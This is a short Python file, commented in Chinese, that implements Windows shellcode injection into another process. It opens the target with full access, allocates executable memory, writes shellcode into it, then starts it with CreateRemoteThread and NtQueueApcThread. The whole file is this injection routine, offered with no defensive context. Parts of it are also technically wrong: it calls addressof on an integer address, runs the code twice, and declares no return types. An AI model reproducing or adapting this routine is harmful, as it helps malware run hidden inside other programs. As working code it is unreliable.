import ctypes

def apc_injection(target_process_id, shellcode):
    ntdll = ctypes.WinDLL('ntdll')

    # 開啟目標進程
    process_handle = ctypes.windll.kernel32.OpenProcess(0x1F0FFF, False, target_process_id)
    
    # 在目標進程空間中配置一塊記憶體區域，用來儲存shellcode
    remote_memory = ctypes.windll.kernel32.VirtualAllocEx(process_handle, 0, len(shellcode), 0x3000, 0x40)
    
    # 在目標進程中寫入shellcode
    ctypes.windll.kernel32.WriteProcessMemory(process_handle, remote_memory, shellcode, len(shellcode), None)
    
    # 創建一個新的執行緒
    thread_id = ctypes.c_ulong()
    thread_handle = ctypes.windll.kernel32.CreateRemoteThread(process_handle, None, 0, remote_memory, None, 0, ctypes.byref(thread_id))
    
    # 將shellcode的執行緒綁定到目標進程的執行緒
    ntdll.NtQueueApcThread(thread_handle, ctypes.addressof(remote_memory), None, None, None)
    
    ctypes.windll.kernel32.CloseHandle(thread_handle)
    ctypes.windll.kernel32.CloseHandle(process_handle)